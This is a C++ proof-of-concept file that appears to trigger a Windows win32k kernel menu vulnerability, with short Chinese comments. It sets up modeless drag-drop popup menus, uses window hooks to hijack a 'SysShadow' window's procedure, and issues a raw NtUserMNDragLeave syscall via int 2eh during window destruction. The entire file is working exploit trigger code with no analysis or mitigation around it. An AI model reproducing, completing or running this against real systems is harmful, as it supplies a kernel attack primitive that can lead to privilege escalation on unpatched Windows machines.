#include <Windows.h>
#include <iostream>

HMENU hpopupMenu[2] = {};
HWND hWindowMain = NULL;
static UINT  iMenuCreated = 0;
#define MENUCLASS_NAME L"#32768"

#define MN_ENDMENU 0x1F3
ULONG_PTR
xxSyscall(UINT num, ULONG_PTR param1, ULONG_PTR param2)
{
	__asm { mov eax, num };
	__asm { int 2eh };
}

CONST UINT num_NtUserMNDragLeave = 0x11EC;

LRESULT WINAPI
xxShadowWindowProc(
	_In_ HWND   hwnd,
	_In_ UINT   msg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	if (msg == WM_NCDESTROY)
	{
		xxSyscall(num_NtUserMNDragLeave, 0, 0);
	}
	return DefWindowProcW(hwnd, msg, wParam, lParam);
}

static
LRESULT
CALLBACK
xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
	// [+] 先做吧
	static HWND hwndMenuHit = NULL;
	tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;
	static UINT iShadowCount = 0;
	if (cwp->message != WM_NCCREATE)	// [+] 只是处理这个
	{
		return CallNextHookEx(0, code, wParam, lParam);
	}

	WCHAR szTemp[0x20] = { 0 };
	GetClassNameW(cwp->hwnd, szTemp, 0x14);

	if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL)
	{
		
		if (++iShadowCount == 3)
		{
			SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxShadowWindowProc);
		}
		else
		{
			SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_HIDEWINDOW);
			SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_SHOWWINDOW);
		}
	}
	else if (!wcscmp(szTemp, MENUCLASS_NAME))
	{
		hwndMenuHit = cwp->hwnd;
	}
	return CallNextHookEx(0, code, wParam, lParam);
	return NULL;
}
static
VOID
CALLBACK
xxWindowEventProc(
	HWINEVENTHOOK hWinEventHook,
	DWORD         event,
	HWND          hwnd,
	LONG          idObject,
	LONG          idChild,
	DWORD         idEventThread,
	DWORD         dwmsEventTime
)
{

	if (++iMenuCreated >= 2)
	{
		SendMessageW(hwnd, MN_ENDMENU, 0, 0);
	}
	else
	{
		SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002); // (2,2)
	}
}

int main()
{
	LPCSTR szMenuItem = "item";
	MENUINFO mi = { 0 };
	mi.cbSize = sizeof(mi);
	mi.fMask = MIM_STYLE;
	mi.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;

	hpopupMenu[0] = CreatePopupMenu();
	hpopupMenu[1] = CreatePopupMenu();
	SetMenuInfo(hpopupMenu[0], &mi);
	SetMenuInfo(hpopupMenu[1], &mi);
	AppendMenuA(hpopupMenu[0], MF_BYPOSITION | MF_POPUP, (UINT_PTR)hpopupMenu[1], szMenuItem);
	AppendMenuA(hpopupMenu[1], MF_BYPOSITION | MF_POPUP, 0, szMenuItem);

	WNDCLASSEXW wndClass = { 0 };
	wndClass = { 0 };
	wndClass.cbSize = sizeof(WNDCLASSEXW);
	wndClass.lpfnWndProc = DefWindowProcW;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = GetModuleHandleA(NULL);
	wndClass.lpszMenuName = NULL;
	wndClass.lpszClassName = L"WNDCLASSMAIN";
	RegisterClassExW(&wndClass);
	hWindowMain = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
		L"WNDCLASSMAIN",
		NULL,
		WS_VISIBLE,
		0,
		0,
		1,
		1,
		NULL,
		NULL,
		GetModuleHandleA(NULL),
		NULL);

	SetWindowsHookExW(WH_CALLWNDPROC, xxWindowHookProc,
		GetModuleHandleA(NULL),
		GetCurrentThreadId());
	SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,
		GetModuleHandleA(NULL),
		xxWindowEventProc,
		GetCurrentProcessId(),
		GetCurrentThreadId(),
		0);
	//__debugbreak();
	TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL);
	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	return 0;
}